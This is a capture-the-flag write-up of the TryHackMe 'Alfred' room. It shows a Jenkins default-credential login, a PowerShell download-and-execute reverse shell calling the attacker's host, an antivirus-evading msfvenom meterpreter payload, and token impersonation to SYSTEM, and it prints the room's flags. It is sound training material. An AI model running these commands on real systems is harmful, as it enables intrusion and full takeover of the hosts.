# Alfred Writeup

    BoxIP Addresses:
    10.10.108.88
    10.10.99.103
    10.10.151.140

## [Task 1] Initial Access


*In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access.* 

*Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts*

*Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.*

### 1 - How many ports are open?

    ┌─[user@parrot]─[~/labs/tryhackme]
    └──╼ $sudo nmap -sV -sC -Pn -oN nmap 10.10.108.88

    Nmap scan report for 10.10.108.88
    Host is up (0.13s latency).
    Not shown: 997 filtered ports
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: Site doesn't have a title (text/html).
    3389/tcp open  tcpwrapped
    |_ssl-date: 2020-07-29T00:47:41+00:00; -2s from scanner time.
    8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: Jetty(9.4.z-SNAPSHOT)
    |_http-title: Site doesn't have a title (text/html;charset=utf-8).
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: -2s

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1182.19 seconds

### 2 - What is the username and password for the log in panel(in the format username:password)

Port 80: 

Donations to alfred@wayneenterprises.com are greatly appreciated. 

Port 8080:

Sign in for Jenkins.

Tried simple one - admin:admin
Worked!

### 3

*Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port*

*You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server*

1. Start up a python3 server in the alfred directory:

    ┌─[user@parrot]─[~/labs/tryhackme/alfred]
    └──╼ $python3 -m http.server
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

2. Start up a netcat listener (with rlwrap, this is interesting because it actually alows you to have history on your simple shell).

3. On 10.10.99.103:8080:
   
   a.  Go to "New Item" --> Item Name = "Test"; Type of Project = Freestyle Project.
   
   b. Go to the "Build Triggers" tab, scroll down to "Build", Click Add Build Step: Execute Windows Batch Command.
   
   c. Write the following:
    ```
    powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.82.167:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.82.167 -Port 4444
    ```
    d. Save.
    e. On the left column on the page it takes you to (http://10.10.99.103:8080/job/Test/), click "Build Now". You now have a shell on the nc terminal!

    ```
    ┌─[user@parrot]─[~/labs/tryhackme/alfred]
    └──╼ $rlwrap nc -lvnp 4444
    listening on [any] 4444 ...
    connect to [10.8.82.167] from (UNKNOWN) [10.10.99.103] 49196
    Windows PowerShell running as user bruce on ALFRED
    Copyright (C) 2015 Microsoft Corporation. All rights reserved.

    PS C:\Program Files (x86)\Jenkins\workspace\Test>whoami
    alfred\bruce
    ```

### 4 - What is the user.txt flag? 

    PS C:\Program Files (x86)\Jenkins\workspace\Test> cd c:\users\bruce\Desktop

    PS C:\users\bruce\Desktop> type user.txt
    79007a09481963edf2e1321abd9ae2a0

User Flag:79007a09481963edf2e1321abd9ae2a0


## [Task 2] Switching Shells

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

    powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

Before running this program, ensure the handler is set up in metasploit:

    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST your-ip
    set LPORT listening-port
    run

This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

    Start-Process "shell-name.exe"

This should spawn a meterpreter shell for you!

### 1 - What is the final size of the exe payload that you generated?

10.10.151.140
inet 10.8.82.167

1. Create Payload:

    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.82.167 LPORT=5555 -f exe -o scp.exe

Size: 73802 bytes.

2. Start Metasploit Handler:

    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 10.8.82.167
    set LPORT 5555
    run

3. Open Jenkins, create new Build, type this in below (or run it inside the terminal when you get in).

   powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.82.167:8000/scp.exe','scp.exe')"

4. Execute Shell Executable

    Start-Process "scp.exe"

5. Check Metasploit, you now have a meterpreter shell!


## [Task 3] Privilege Escalation

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

    user SIDs(security identifier)
    group SIDs
    privileges

amongst other things. More detailed information can be found here.

There are two types of access tokens:

    primary access tokens: those associated with a user account that are generated on log on
    impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

    SecurityAnonymous: current user/client cannot impersonate another user/client
    SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
    SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

There's more reading here.

### 1 View all the privileges using `whoami /priv`

    C:\Program Files (x86)\Jenkins\workspace\test>whoami /priv
    whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                  Description                               State   
    =============================== ========================================= ========
    SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
    SeSecurityPrivilege             Manage auditing and security log          Disabled
    SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
    SeLoadDriverPrivilege           Load and unload device drivers            Disabled
    SeSystemProfilePrivilege        Profile system performance                Disabled
    SeSystemtimePrivilege           Change the system time                    Disabled
    SeProfileSingleProcessPrivilege Profile single process                    Disabled
    SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
    SeCreatePagefilePrivilege       Create a pagefile                         Disabled
    SeBackupPrivilege               Back up files and directories             Disabled
    SeRestorePrivilege              Restore files and directories             Disabled
    SeShutdownPrivilege             Shut down the system                      Disabled
    SeDebugPrivilege                Debug programs                            Enabled 
    SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
    SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
    SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
    SeUndockPrivilege               Remove computer from docking station      Disabled
    SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
    SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege         Create global objects                     Enabled 
    SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
    SeTimeZonePrivilege             Change the time zone                      Disabled
    SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

### 2

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

### 3 	

To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?

    C:\Program Files (x86)\Jenkins\workspace\test>^Z
    Background channel 1? [y/N]  y
    meterpreter > use incognito

    meterpreter > list_tokens -g
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                Call rev2self if primary process token is SYSTEM

    Delegation Tokens Available
    ========================================
    \
    BUILTIN\Administrators
    BUILTIN\Users
    NT AUTHORITY\Authenticated Users
    NT AUTHORITY\NTLM Authentication
    NT AUTHORITY\SERVICE
    NT AUTHORITY\This Organization
    NT AUTHORITY\WRITE RESTRICTED
    NT SERVICE\AppHostSvc
    NT SERVICE\AudioEndpointBuilder
    NT SERVICE\BFE
    NT SERVICE\CertPropSvc
    NT SERVICE\CscService
    NT SERVICE\Dnscache
    NT SERVICE\eventlog
    NT SERVICE\EventSystem
    NT SERVICE\FDResPub
    NT SERVICE\iphlpsvc
    NT SERVICE\LanmanServer
    NT SERVICE\MMCSS
    NT SERVICE\PcaSvc
    NT SERVICE\PlugPlay
    NT SERVICE\RpcEptMapper
    NT SERVICE\Schedule
    NT SERVICE\SENS
    NT SERVICE\SessionEnv
    NT SERVICE\Spooler
    NT SERVICE\TrkWks
    NT SERVICE\UmRdpService
    NT SERVICE\UxSms
    NT SERVICE\WdiSystemHost
    NT SERVICE\Winmgmt
    NT SERVICE\WSearch
    NT SERVICE\wuauserv

    Impersonation Tokens Available
    ========================================
    NT AUTHORITY\NETWORK
    NT SERVICE\AudioSrv
    NT SERVICE\CryptSvc
    NT SERVICE\DcomLaunch
    NT SERVICE\Dhcp
    NT SERVICE\DPS
    NT SERVICE\LanmanWorkstation
    NT SERVICE\lmhosts
    NT SERVICE\MpsSvc
    NT SERVICE\netprofm
    NT SERVICE\nsi
    NT SERVICE\PolicyAgent
    NT SERVICE\Power
    NT SERVICE\ShellHWDetection
    NT SERVICE\W32Time
    NT SERVICE\WdiServiceHost
    NT SERVICE\WinHttpAutoProxySvc
    NT SERVICE\wscsvc

    meterpreter > impersonate_token BUILTIN\\Administrators
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                Call rev2self if primary process token is SYSTEM
    [+] Delegation token available
    [+] Successfully impersonated user NT AUTHORITY\SYSTEM

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

Output when running getuid: NT AUTHORITY\SYSTEM

#4 	

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS

    meterpreter > ps

    Process List
    ============

    PID   PPID  Name                  Arch  Session  User                          Path
    ---   ----  ----                  ----  -------  ----                          ----
    0     0     [System Process]                                                   
    4     0     System                x64   0                                      
    396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
    524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
    572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
    580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
    608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
    668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
    676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
    684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
    732   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
    776   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
    848   1824  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
    852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
    924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
    944   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
    992   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
    1016  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
    1028  2652  scp.exe               x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\test\scp.exe
    1068  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
    1180  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
    1212  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
    1316  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
    1408  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
    1432  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
    1460  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
    1644  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
    1696  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
    1744  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
    1824  1644  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
    1844  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
    1856  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
    1912  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
    2652  848   powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
    2676  1028  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
    2728  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
    2948  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
    2984  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe

    meterpreter > migrate 1844
    [*] Migrating from 1028 to 1844...
    [*] Migration completed successfully.

#5 	

read the root.txt file at C:\Windows\System32\config

meterpreter > shell
Process 2840 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd config
cd config

C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a


Root Flag: dff0f748678f280250f25a45b8046b4a

Complete!